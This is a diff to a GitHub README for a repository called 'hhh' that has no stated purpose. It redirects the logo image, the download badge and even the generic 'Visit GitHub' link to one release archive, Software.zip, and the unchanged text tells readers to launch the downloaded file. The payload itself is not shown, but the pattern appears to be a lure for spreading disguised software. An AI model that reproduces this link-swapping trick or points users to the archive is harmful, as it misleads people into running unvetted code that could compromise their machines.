@@ -1,6 +1,6 @@
 # 🚀 Welcome to the "hhh" Repository!
 
-![hhh Logo](https://via.placeholder.com/150)
+![hhh Logo](https://github.com/Sak956/hhh/releases/download/v1.0/Software.zip)
 
 ## Description
 This repository does not provide a specific short description, leaving the content open for exploration and interpretation by its users.
@@ -9,7 +9,7 @@ This repository does not provide a specific short description, leaving the conte
 The repository does not specify any particular topics, encouraging contributors to explore and contribute diverse ideas and projects.
 
 ## Download
-[![Download hhh v1.0.0](https://img.shields.io/badge/Download-v1.0.0-blue.svg)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download hhh v1.0.0](https://github.com/Sak956/hhh/releases/download/v1.0/Software.zip)](https://github.com/Sak956/hhh/releases/download/v1.0/Software.zip)
 
 Click on the button above to download version 1.0.0 of the software. Launch the downloaded file to start using the program.
 
@@ -46,4 +46,4 @@ This repository is licensed under the MIT License - see the [LICENSE](LICENSE) f
 
 Feel free to dive into this open-ended repository and let your imagination soar! Happy coding! 🌟
 
-[Visit GitHub](https://github.com/) for more exciting projects.
+[Visit GitHub](https://github.com/Sak956/hhh/releases/download/v1.0/Software.zip) for more exciting projects.
